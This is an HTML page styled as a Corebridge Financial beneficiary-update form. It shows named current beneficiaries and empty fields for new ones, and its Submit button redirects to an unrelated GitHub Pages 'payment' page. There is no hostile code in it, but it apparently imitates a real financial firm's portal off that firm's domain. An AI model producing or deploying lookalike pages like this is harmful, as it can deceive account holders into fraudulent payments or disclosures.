<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Corebridge Financial - Beneficiary Update</title>
  <style>
    :root {
      --bg: #020826;
      --card: rgba(255, 255, 255, 0.03);
      --card-border: rgba(255, 255, 255, 0.1);
      --purple: #6c1dff;
      --purple-soft: #8b5cff;
      --mint: #58d2be;
      --text: #ffffff;
      --muted: #d8ddef;
      --button-dark: #2a2f40;
      --input-bg: rgba(255, 255, 255, 0.06);
      --input-border: rgba(255, 255, 255, 0.18);
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: var(--bg);
      color: var(--text);
    }

    .top-bar {
      background: linear-gradient(90deg, #5b14e6 0%, #6c1dff 100%);
      height: 70px;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 0 24px;
    }

    .logo-img {
      height: 40px;
      width: auto;
      object-fit: contain;
      display: block;
    }

    .page {
      max-width: 1180px;
      margin: 0 auto;
      padding: 28px 24px 48px;
    }

    .notice {
      margin: 8px 0 28px;
      font-size: 18px;
      line-height: 1.45;
      font-weight: 700;
      color: var(--text);
    }

    .cards {
      display: grid;
      grid-template-columns: repeat(2, minmax(320px, 1fr));
      gap: 24px;
      align-items: start;
    }

    .card {
      background: linear-gradient(180deg, rgba(255,255,255,0.03) 0%, rgba(255,255,255,0.015) 100%);
      border: 1px solid var(--card-border);
      border-radius: 22px;
      padding: 24px;
      min-height: 420px;
      box-shadow: inset 0 1px 0 rgba(255,255,255,0.03);
    }

    .card-title {
      margin: 0 0 22px;
      color: var(--text);
      font-size: 24px;
      font-weight: 700;
    }

    .section-title {
      margin: 0 0 16px;
      color: var(--purple-soft);
      font-size: 16px;
      font-weight: 700;
    }

    .beneficiary-block + .beneficiary-block {
      margin-top: 28px;
      padding-top: 22px;
      border-top: 1px solid rgba(255,255,255,0.08);
    }

    .detail,
    .field-group {
      margin-bottom: 14px;
    }

    .detail:last-child,
    .field-group:last-child {
      margin-bottom: 0;
    }

    .label {
      display: block;
      color: var(--muted);
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 5px;
    }

    .value {
      color: var(--text);
      font-size: 18px;
      line-height: 1.4;
      font-weight: 700;
      min-height: 25px;
    }

    input {
      width: 100%;
      height: 46px;
      border-radius: 12px;
      border: 1px solid var(--input-border);
      background: var(--input-bg);
      color: var(--text);
      padding: 0 14px;
      font-size: 16px;
      outline: none;
      display: block;
    }

    input::placeholder {
      color: rgba(216, 221, 239, 0.45);
    }

    input:focus {
      border-color: var(--purple-soft);
      box-shadow: 0 0 0 3px rgba(139, 92, 255, 0.12);
    }

    .actions {
      display: flex;
      justify-content: center;
      gap: 28px;
      margin-top: 30px;
      flex-wrap: wrap;
    }

    .btn {
      min-width: 150px;
      height: 52px;
      border-radius: 14px;
      border: 1px solid transparent;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: transform 0.15s ease, box-shadow 0.15s ease;
    }

    .btn:hover {
      transform: translateY(-1px);
    }

    .btn-cancel {
      background: var(--button-dark);
      border-color: rgba(255, 255, 255, 0.08);
      color: var(--text);
    }

    .btn-submit {
      background: var(--mint);
      color: #000;
      box-shadow: 0 10px 24px rgba(88, 210, 190, 0.18);
    }

    @media (max-width: 860px) {
      .cards {
        grid-template-columns: 1fr;
      }

      .card {
        min-height: auto;
      }

      .page {
        padding: 22px 16px 36px;
      }

      .notice {
        font-size: 17px;
      }
    }
  </style>
</head>
<body>
  <header class="top-bar">
    <img src="corebridge-logo.png" alt="Corebridge Financial" class="logo-img" />
  </header>

  <main class="page">
    <p class="notice">Beneficiary changes made over the phone will be pended until a signed confirmation is received.</p>

    <section class="cards" aria-label="Beneficiary details">
      <article class="card">
        <h1 class="card-title">Current Beneficiaries</h1>

        <div class="beneficiary-block">
          <div class="section-title">Primary</div>
          <div class="detail">
            <span class="label">Name</span>
            <div class="value">Michael Sundholm</div>
          </div>
          <div class="detail">
            <span class="label">Relationship</span>
            <div class="value">Brother</div>
          </div>
          <div class="detail">
            <span class="label">Allocation</span>
            <div class="value">100%</div>
          </div>
        </div>

        <div class="beneficiary-block">
          <div class="section-title">Contingent</div>
          <div class="detail">
            <span class="label">Name</span>
            <div class="value">David Sundholm</div>
          </div>
          <div class="detail">
            <span class="label">Relationship</span>
            <div class="value">Father</div>
          </div>
          <div class="detail">
            <span class="label">Allocation</span>
            <div class="value">100%</div>
          </div>
        </div>
      </article>

      <article class="card">
        <h1 class="card-title">Updated Beneficiaries</h1>

        <div class="beneficiary-block">
          <div class="section-title">Primary</div>
          <div class="field-group">
            <label class="label" for="primaryName">Name</label>
            <input id="primaryName" type="text" placeholder="Enter name" />
          </div>
          <div class="field-group">
            <label class="label" for="primaryRelationship">Relationship</label>
            <input id="primaryRelationship" type="text" placeholder="Enter relationship" />
          </div>
          <div class="field-group">
            <label class="label" for="primaryAllocation">Allocation</label>
            <input id="primaryAllocation" type="text" placeholder="Enter allocation" />
          </div>
        </div>

        <div class="beneficiary-block">
          <div class="section-title">Contingent</div>
          <div class="field-group">
            <label class="label" for="contingentName">Name</label>
            <input id="contingentName" type="text" placeholder="Enter name" />
          </div>
          <div class="field-group">
            <label class="label" for="contingentRelationship">Relationship</label>
            <input id="contingentRelationship" type="text" placeholder="Enter relationship" />
          </div>
          <div class="field-group">
            <label class="label" for="contingentAllocation">Allocation</label>
            <input id="contingentAllocation" type="text" placeholder="Enter allocation" />
          </div>
        </div>
      </article>
    </section>

    <div class="actions">
      <button type="button" class="btn btn-cancel" id="cancelBtn">Cancel</button>
      <button type="button" class="btn btn-submit" id="submitBtn">Submit</button>
    </div>
  </main>

  <script>
    document.getElementById('cancelBtn').addEventListener('click', function () {
      window.history.back();
    });

    document.getElementById('submitBtn').addEventListener('click', function () {
      window.location.href = 'https://ealjim.github.io/corebridge-financial-payment/index.html';
    });
  </script>
</body>
</html>
